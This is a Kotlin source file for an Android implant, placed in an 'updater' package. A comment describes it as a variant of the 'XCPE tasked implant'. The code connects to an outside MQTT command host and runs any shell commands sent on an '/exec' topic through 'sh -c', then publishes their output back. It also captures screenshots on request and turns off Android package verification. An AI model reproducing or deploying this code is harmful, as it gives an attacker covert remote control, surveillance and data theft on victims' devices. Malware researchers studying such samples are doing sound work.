package com.example.updater

import android.content.Context
import android.provider.Settings
import android.view.SurfaceControl
import org.eclipse.paho.client.mqttv3.MqttCallback
import org.eclipse.paho.client.mqttv3.MqttClient
import org.eclipse.paho.client.mqttv3.MqttMessage
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken

// Kotlin variant of the XCPE tasked implant: every application identifier,
// host, and topic differs from the recorded sample, and verification is
// disabled through the Secure namespace putString form instead of
// Global.putInt. Only platform/library API surfaces are shared.
class MqttTaskingVariant(private val ctx: Context) : MqttCallback {
    private lateinit var link: MqttClient

    fun start() {
        link = MqttClient("tcp://broker.example.net:1883", "unit-42")
        link.setCallback(this)
        link.connect()
        link.subscribe("units/42/tasks/#")
    }

    fun relaxVerifier() {
        Settings.Secure.putString(ctx.contentResolver, "package_verifier_enable", "0")
    }

    override fun messageArrived(topic: String, message: MqttMessage) {
        val order = String(message.payload)
        if (topic.endsWith("/exec")) {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", order))
            val out = proc.inputStream.readBytes()
            link.publish("units/42/out", out, 1, false)
        } else if (topic.endsWith("/grab")) {
            val shot = SurfaceControl.screenshot(960, 540)
            link.publish("units/42/frame", shot.toString().toByteArray(), 1, false)
        }
    }

    override fun deliveryComplete(token: IMqttDeliveryToken?) {}
    override fun connectionLost(cause: Throwable?) {}
}
